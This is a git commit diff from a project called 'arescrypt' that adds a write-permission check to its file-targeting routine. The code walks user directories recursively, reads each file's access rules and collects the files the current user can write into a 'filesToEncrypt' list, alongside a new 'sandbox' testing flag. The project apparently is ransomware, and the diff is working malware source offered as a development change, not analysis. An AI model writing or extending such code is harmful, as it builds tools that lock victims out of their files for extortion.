79191954771cab48673193fcb2a9ce87b2c332cb
Wįłłý Fœx <BlackVikingPro@users.noreply.github.com>
2017-11-07 15:29:59 -0600

    added 'check for write permissions' feature

--- arescrypt/Program.cs
+++ arescrypt/Program.cs
@@ -5,7 +5,9 @@ namespace arescrypt
 {
     class Program
     {
+        static string sessionDomain = Environment.UserDomainName; // get current sessions domain
         static string sessionUsername = Environment.UserName; // get current sessions username
+        static bool sandbox = true; // Safemode for testing/debugging
 
         static void Main(string[] args)
         {
@@ -30,9 +32,30 @@ namespace arescrypt
             var filesToEncrypt = new System.Collections.Generic.List<string> { };
             foreach (string directory in directoriesToEncrypt.Distinct().ToList())
             {
-                string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
-                foreach (string file in files)
-                    filesToEncrypt.Add(file);
+                try
+                {
+                    string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
+                    foreach (string file in files)
+                    {
+                        string NtAccountName = sessionDomain + @"\" + sessionUsername;
+                        System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(file);
+                        System.Security.AccessControl.DirectorySecurity acl = di.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
+                        System.Security.AccessControl.AuthorizationRuleCollection rules = acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount));
+
+                        //Go through the rules returned from the DirectorySecurity
+                        foreach (System.Security.AccessControl.AuthorizationRule rule in rules)
+                        {
+                            //If we find one that matches the identity we are looking for
+                            if (rule.IdentityReference.Value.Equals(NtAccountName, StringComparison.CurrentCultureIgnoreCase))
+                            {
+                                //Cast to a FileSystemAccessRule to check for access rights
+                                if ((((System.Security.AccessControl.FileSystemAccessRule)rule).FileSystemRights & System.Security.AccessControl.FileSystemRights.WriteData) > 0)
+                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
+                            }
+                        }
+                    }
+                } catch (UnauthorizedAccessException)
+                { Console.WriteLine("Unable to access: " + directory); }
             }
 
             foreach (string file in filesToEncrypt)
